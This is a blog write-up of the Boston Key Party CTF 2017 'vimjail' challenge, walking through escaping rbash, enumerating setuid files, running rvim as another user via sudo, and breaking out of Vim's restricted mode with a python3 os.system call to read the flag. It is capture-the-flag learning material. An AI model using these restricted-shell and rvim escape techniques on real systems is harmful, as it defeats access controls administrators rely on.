<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Boston Key Party CTF 2017: vimjail write-up</title><meta name="description" content="Write-up of Boston Key Party CTF 2017: vimjail."><meta name="keywords" content="boston key party, boston key party 2017, rvim, write-up"><link rel="stylesheet" href="/assets/main.css"><link rel="canonical" href="https://yous.be/2017/03/01/boston-key-party-ctf-2017-vimjail-write-up/"><link rel="alternate" type="application/rss+xml" title="Yous" href="https://yous.be/atom.xml"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="icon" type="image/png" href="/icon-192x192.png"><link rel="apple-touch-icon" sizes="57x57" href="/apple-touch-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/apple-touch-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/apple-touch-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/apple-touch-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/apple-touch-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/apple-touch-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/apple-touch-icon-152x152.png"><link rel="apple-touch-icon" sizes="167x167" href="/apple-touch-icon-167x167.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon-180x180.png"><link rel="mask-icon" color="#2568ba" href="/safari-pinned-tab.svg"><meta name="msapplication-TileColor" content="#2568ba"><meta name="msapplication-TileImage" content="/mstile-144x144.png"><meta property="fb:admins" content="100001802412550"><meta property="og:title" content="Boston Key Party CTF 2017: vimjail write-up"><meta property="og:site_name" content="Yous"><meta property="og:url" content="https://yous.be/2017/03/01/boston-key-party-ctf-2017-vimjail-write-up/"><meta property="og:description" content="Write-up of Boston Key Party CTF 2017: vimjail."><meta property="og:image" content="http://yous.be/images/about/yous.png"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Boston Key Party CTF 2017: vimjail write-up"><meta name="twitter:description" content="Write-up of Boston Key Party CTF 2017: vimjail."><meta name="twitter:image:src" content="http://yous.be/images/about/yous.png"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Bitter:ital,wght@0,400;0,700;1,400&amp;display=swap" rel="stylesheet"> <script async src="https://www.googletagmanager.com/gtag/js?id=G-KZKJJ9M5EL"></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-KZKJJ9M5EL'); </script><body><header class="site-header"><div class="wrapper"> <a class="site-title" href="/">Yous</a><nav class="site-nav"> <a class="page-link" href="/about/">About</a> <a class="page-link" href="/archives/">Archives</a></nav></div></header><main class="page-content" aria-label="Content"><div class="wrapper"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header class="post-header"><h1 class="post-title" itemprop="name headline">Boston Key Party CTF 2017: vimjail write-up</h1><p class="post-meta"><time datetime="2017-03-01T09:34:52+00:00" itemprop="datePublished">Mar 1, 2017</time> • <a href="/categories/ctf/">CTF</a></p></header><div class="post-content" itemprop="articleBody"><h2>vimjail (pwn 150)</h2><blockquote><ul><li><code class="language-plaintext highlighter-rouge">ssh ctfuser@ec2-54-200-176-5.us-west-2.compute.amazonaws.com</code><li>password: <code class="language-plaintext highlighter-rouge">loginPWforVimJail</code></ul><p>Can you read the flag?</p><p><em>UPDATES</em></p><ul><li>(13:38 UTC Saturday): The flag is not in <code class="language-plaintext highlighter-rouge">/tmp</code>.<li>(13:31 EST Saturday): new ip</ul></blockquote><h2>Looking around</h2><p>Well, you would do <code class="language-plaintext highlighter-rouge">ls</code> first when you logged in, so do we. And there was <code class="language-plaintext highlighter-rouge">~/flagReader</code>.</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctfuser@ip-172-31-31-196:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-als</span> /home/ctfuser/flagReader
12 <span class="nt">---S--x---</span> 1 topsecretuser secretuser 8768 Feb 25 08:42 /home/ctfuser/flagReader
</code></pre></div></div><p>If you try completion by pressing Tab key or try to move around using <code class="language-plaintext highlighter-rouge">cd</code>, it fails with an error message from rbash. It’s restricted bash, but you can simply run <code class="language-plaintext highlighter-rouge">bash</code> to escape.</p><p>While moving around, we found nothing special without <code class="language-plaintext highlighter-rouge">/.flag</code>. Also there were some <code class="language-plaintext highlighter-rouge">.s[a-z][a-z]</code> files under <code class="language-plaintext highlighter-rouge">/var/tmp/</code> and <code class="language-plaintext highlighter-rouge">/tmp/</code>, created by <code class="language-plaintext highlighter-rouge">secretuser</code>. But there are not in fixed location when the problem server was changed, so we thought there would be a way to run Vim under <code class="language-plaintext highlighter-rouge">secretuser</code>’s permission.</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctfuser@ip-172-31-31-196:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-als</span> /.flag
4 <span class="nt">-r--------</span> 1 topsecretuser topsecretuser 39 Feb 25 08:42 /.flag
</code></pre></div></div><p>We also tried to find setuid or setgid files, but there was only the previous <code class="language-plaintext highlighter-rouge">flagReader</code>.</p><div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ctfuser@ip-172-31-31-196:/tmp<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="nt">-type</span> f 2&gt;/dev/null
/bin/ping
/bin/ping6
/bin/fusermount
/bin/umount
/bin/su
/bin/mount
/bin/ntfs-3g
/sbin/unix_chkpwd
/sbin/pam_extrausers_chkpwd
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/crontab
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/chage
/usr/bin/sudo
/usr/bin/bsd-write
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/expiry
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/ssh-agent
/usr/bin/passwd
/usr/bin/mlocate
/home/ctfuser/flagReader
</code></pre></div></div><h2>Jump into Vim</h2><p>Suddenly <a href="http://zzoru.github.io">@zzoru</a> mentioned that we can run <code class="language-plaintext highlighter-rouge">sudo -u secretuser /usr/bin/rvim</code>. Later, I learned that <code class="language-plaintext highlighter-rouge">sudo</code> has <code class="language-plaintext highlighter-rouge">-l</code>, <code class="language-plaintext highlighter-rouge">--list</code> option:</p><pre><code class="language-man">-l, --list  If no command is specified, list the allowed (and
            forbidden) commands for the invoking user (or the user
            specified by the -U option) on the current host.  A longer
            list format is used if this option is specified multiple
            times and the security policy supports a verbose output
            format.
</code></pre><p>So now we’re able to run Vim under <code class="language-plaintext highlighter-rouge">secretuser</code>’s permission!</p><h2>rvim</h2><p>So, what’s rvim? You can see the description of it by typing <code class="language-plaintext highlighter-rouge">:help rvim</code> in Vim:</p><div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rvim    <span class="k">vim</span> <span class="p">-</span>Z      Like <span class="s2">"vim"</span><span class="p">,</span> but <span class="k">in</span> restricted <span class="k">mode</span> <span class="p">(</span>see <span class="p">|-</span>Z<span class="p">|)</span>   *rvim*
</code></pre></div></div><p>Again, <code class="language-plaintext highlighter-rouge">:help -Z</code>:</p><div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code>                                                *<span class="p">-</span>Z* *restricted<span class="p">-</span><span class="k">mode</span>* *E145*
<span class="p">-</span>Z              Restricted <span class="k">mode</span><span class="p">.</span>  All commands that <span class="k">make</span> use of an external
                <span class="k">shell</span> are disabled<span class="p">.</span>  This includes suspending with CTRL<span class="p">-</span>Z<span class="p">,</span>
                <span class="c">":sh", filtering, the system() function, backtick expansion,</span>
                <span class="k">delete</span><span class="p">(),</span> <span class="nb">rename</span><span class="p">(),</span> <span class="nb">mkdir</span><span class="p">(),</span> <span class="nb">writefile</span><span class="p">(),</span> <span class="nb">libcall</span><span class="p">(),</span>
                <span class="nb">job_start</span><span class="p">(),</span> etc<span class="p">.</span>
                <span class="p">{</span>not <span class="k">in</span> Vi<span class="p">}</span>
</code></pre></div></div><p>Yes, it’s the Vim version of rbash. We can’t run <code class="language-plaintext highlighter-rouge">:!/home/ctfuser/flagReader</code>, or <code class="language-plaintext highlighter-rouge">:set shell=/home/ctfuser/flagReader | shell</code> in restricted mode. Well, this is the main content of vimjail.</p><h2>Jailbreak</h2><p>Seeing <code class="language-plaintext highlighter-rouge">:version</code>, we found that it has extra patch 8.0.0056, so <a href="https://www.cvedetails.com/cve/CVE-2016-1248/">CVE-2016-1248</a> exploiting modeline would also not work. However, it’s containing <code class="language-plaintext highlighter-rouge">+python3</code> support. So first we tried to execute Python with something like <code class="language-plaintext highlighter-rouge">:python3 print(1)</code>. And that worked!</p><p>We just executed <code class="language-plaintext highlighter-rouge">flagReader</code>:</p><div class="language-vim highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">:</span><span class="k">python3</span> <span class="k">import</span> os; os<span class="p">.</span><span class="nb">system</span><span class="p">(</span><span class="s1">'/home/ctfuser/flagReader'</span><span class="p">)</span>
</code></pre></div></div><p>Then it prints the flag. So the flag is <code class="language-plaintext highlighter-rouge">flag{rVim_is_no_silverbullet!!!111elf}</code>.</p></div></article></div></main><footer class="site-footer"><div class="wrapper"><p> Content on this site is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a><br /> &copy; 2013&ndash;2023 - <a href="/about/">Yous</a> - Powered by <a href="https://jekyllrb.com">Jekyll</a> &amp; <a href="https://github.com/yous/whiteglass">whiteglass</a> - Subscribe via <a href="https://yous.be/atom.xml">RSS</a></p></div></footer>
